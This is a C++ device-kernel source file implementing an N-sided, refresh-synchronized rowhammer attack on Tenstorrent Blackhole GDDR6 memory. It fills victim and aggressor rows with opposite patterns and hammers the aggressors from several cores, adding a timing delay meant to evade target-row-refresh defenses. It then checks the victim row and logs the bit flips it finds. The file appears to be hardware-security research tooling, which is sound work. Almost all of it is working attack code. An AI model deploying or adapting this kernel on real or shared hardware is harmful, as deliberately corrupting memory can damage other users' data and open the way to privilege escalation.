// SPDX-FileCopyrightText: © 2026
// SPDX-License-Identifier: Apache-2.0
//
// N-sided REF-synchronized rowhammer kernel for Tenstorrent Blackhole GDDR6.
//
// Combines two techniques:
//   1. N-sided TRR evasion: round-robin N aggressor rows to overflow the
//      TRR counter table (same as rowhammer_nsided_kernel.cpp).
//   2. REF synchronization: insert a calibrated delay between each sweep
//      through the aggressor set, shifting our activation pattern relative
//      to DRAM auto-refresh (tREFI) windows so TRR's sampler sees fewer
//      of our activations.
//
// This is the single highest-leverage attack variant: it simultaneously
// evades TRR counting AND timing-based sampling.  The delay loop uses
// volatile integer adds (~1 BRISC cycle each) so the compiler cannot
// fold it away.
//
// === Runtime arguments ===
//   arg 0:  dram_noc_x
//   arg 1:  dram_noc_y
//   arg 2:  victim_addr
//   arg 3:  hammer_iters       — full sweeps through all aggressors
//   arg 4:  data_pattern
//   arg 5:  l1_scratch_addr
//   arg 6:  l1_result_addr
//   arg 7:  use_barrier         0 = pipelined, 1 = serialized
//   arg 8:  num_aggressors
//   arg 9:  core_id             0 = primary (write+verify), >0 = hammer-only
//   arg 10: delay_iters         per-sweep delay (integer adds, ~1 cyc each)
//   arg 11+: aggressor DRAM addresses

#include <cstdint>

constexpr uint32_t ROW_SIZE          = 8192;
constexpr uint32_t CACHELINE         = 64;
constexpr uint32_t CACHELINES_PER_ROW = ROW_SIZE / CACHELINE;  // 128
constexpr uint32_t MAX_AGGRESSORS    = 30;

constexpr uint32_t RESULT_HDR_WORDS  = 6;
constexpr uint32_t MAX_FLIP_RECORDS  = 32;
constexpr uint32_t FLIP_RECORD_WORDS = 4;
constexpr uint32_t RESULT_BUF_WORDS  = RESULT_HDR_WORDS + MAX_FLIP_RECORDS * FLIP_RECORD_WORDS;

void kernel_main() {
    uint32_t dram_noc_x      = get_arg_val<uint32_t>(0);
    uint32_t dram_noc_y      = get_arg_val<uint32_t>(1);
    uint32_t victim_addr     = get_arg_val<uint32_t>(2);
    uint32_t hammer_iters    = get_arg_val<uint32_t>(3);
    uint32_t data_pattern    = get_arg_val<uint32_t>(4);
    uint32_t l1_scratch_addr = get_arg_val<uint32_t>(5);
    uint32_t l1_result_addr  = get_arg_val<uint32_t>(6);
    uint32_t use_barrier     = get_arg_val<uint32_t>(7);
    uint32_t num_aggressors  = get_arg_val<uint32_t>(8);
    uint32_t core_id         = get_arg_val<uint32_t>(9);
    uint32_t delay_iters     = get_arg_val<uint32_t>(10);

    if (num_aggressors > MAX_AGGRESSORS) num_aggressors = MAX_AGGRESSORS;

    uint32_t aggr_addrs[MAX_AGGRESSORS];
    for (uint32_t i = 0; i < num_aggressors; i++) {
        aggr_addrs[i] = get_arg_val<uint32_t>(11 + i);
    }

    uint32_t scratch_a = l1_scratch_addr;
    uint32_t scratch_b = l1_scratch_addr + CACHELINE;

    volatile uint32_t* results = reinterpret_cast<volatile uint32_t*>(l1_result_addr);
    for (uint32_t i = 0; i < RESULT_BUF_WORDS; i++) results[i] = 0;

    // ═══════════════════════════════════════════════════════════════════
    // PHASE 1: Write patterns (core 0 only)
    // ═══════════════════════════════════════════════════════════════════
    if (core_id == 0) {
        volatile uint32_t* fill = reinterpret_cast<volatile uint32_t*>(scratch_a);
        for (uint32_t w = 0; w < CACHELINE / sizeof(uint32_t); w++) {
            fill[w] = data_pattern;
        }
        for (uint32_t cl = 0; cl < CACHELINES_PER_ROW; cl++) {
            uint64_t dst = get_noc_addr(dram_noc_x, dram_noc_y, victim_addr + cl * CACHELINE);
            noc_async_write(scratch_a, dst, CACHELINE);
        }
        noc_async_write_barrier();

        uint32_t aggr_pattern = ~data_pattern;
        volatile uint32_t* fill_b = reinterpret_cast<volatile uint32_t*>(scratch_b);
        for (uint32_t w = 0; w < CACHELINE / sizeof(uint32_t); w++) {
            fill_b[w] = aggr_pattern;
        }
        for (uint32_t a = 0; a < num_aggressors; a++) {
            for (uint32_t cl = 0; cl < CACHELINES_PER_ROW; cl++) {
                uint64_t dst = get_noc_addr(dram_noc_x, dram_noc_y,
                                            aggr_addrs[a] + cl * CACHELINE);
                noc_async_write(scratch_b, dst, CACHELINE);
            }
        }
        noc_async_write_barrier();
    }

    // ═══════════════════════════════════════════════════════════════════
    // PHASE 2: N-sided REF-synchronized hammer loop (ALL cores)
    // ═══════════════════════════════════════════════════════════════════
    // Each iteration: sweep all N aggressors, then spin for delay_iters
    // integer adds.  The delay shifts our activation burst relative to
    // the DRAM controller's auto-refresh (REF) command timing.

    uint64_t aggr_noc[MAX_AGGRESSORS];
    for (uint32_t i = 0; i < num_aggressors; i++) {
        aggr_noc[i] = get_noc_addr(dram_noc_x, dram_noc_y, aggr_addrs[i]);
    }

    volatile uint32_t ts_lo = *reinterpret_cast<volatile uint32_t*>(RISCV_DEBUG_REG_WALL_CLOCK_L);
    volatile uint32_t ts_hi = *reinterpret_cast<volatile uint32_t*>(RISCV_DEBUG_REG_WALL_CLOCK_H);
    uint64_t t_start = (static_cast<uint64_t>(ts_hi) << 32) | ts_lo;

    volatile uint32_t accumulator = 0;

    if (use_barrier) {
        for (uint32_t i = 0; i < hammer_iters; i++) {
            for (uint32_t j = 0; j < num_aggressors; j++) {
                noc_async_read(aggr_noc[j], scratch_a, CACHELINE);
                noc_async_read_barrier();
            }
            for (uint32_t d = 0; d < delay_iters; ++d) {
                accumulator += d;
            }
        }
    } else {
        for (uint32_t i = 0; i < hammer_iters; i++) {
            for (uint32_t j = 0; j < num_aggressors; j++) {
                noc_async_read(aggr_noc[j], scratch_a, CACHELINE);
            }
            for (uint32_t d = 0; d < delay_iters; ++d) {
                accumulator += d;
            }
        }
    }

    noc_async_read_barrier();

    volatile uint32_t te_lo = *reinterpret_cast<volatile uint32_t*>(RISCV_DEBUG_REG_WALL_CLOCK_L);
    volatile uint32_t te_hi = *reinterpret_cast<volatile uint32_t*>(RISCV_DEBUG_REG_WALL_CLOCK_H);
    uint64_t t_end = (static_cast<uint64_t>(te_hi) << 32) | te_lo;
    uint64_t elapsed = t_end - t_start;

    // Touch accumulator so delay loop is not optimized away
    results[RESULT_BUF_WORDS - 1] = accumulator;

    // ═══════════════════════════════════════════════════════════════════
    // PHASE 3: Verify victim row (core 0 only)
    // ═══════════════════════════════════════════════════════════════════
    uint32_t num_flips = 0;
    uint32_t total_bit_flips = 0;
    uint32_t record_idx = 0;

    if (core_id == 0) {
        for (uint32_t cl = 0; cl < CACHELINES_PER_ROW; cl++) {
            uint64_t victim_noc = get_noc_addr(dram_noc_x, dram_noc_y,
                                               victim_addr + cl * CACHELINE);
            noc_async_read(victim_noc, scratch_a, CACHELINE);
            noc_async_read_barrier();

            volatile uint32_t* readback = reinterpret_cast<volatile uint32_t*>(scratch_a);
            for (uint32_t w = 0; w < CACHELINE / sizeof(uint32_t); w++) {
                uint32_t actual = readback[w];
                if (actual != data_pattern) {
                    num_flips++;
                    uint32_t diff = actual ^ data_pattern;
                    uint32_t bits = 0;
                    while (diff) { bits += diff & 1; diff >>= 1; }
                    total_bit_flips += bits;

                    if (record_idx < MAX_FLIP_RECORDS) {
                        uint32_t base = RESULT_HDR_WORDS + record_idx * FLIP_RECORD_WORDS;
                        results[base + 0] = cl;
                        results[base + 1] = w;
                        results[base + 2] = data_pattern;
                        results[base + 3] = actual;
                        record_idx++;
                    }
                }
            }
        }
    }

    uint32_t total_activations = hammer_iters * num_aggressors;
    results[0] = 0;
    results[1] = num_flips;
    results[2] = total_bit_flips;
    results[3] = static_cast<uint32_t>(elapsed);
    results[4] = static_cast<uint32_t>(elapsed >> 32);
    results[5] = total_activations;
}
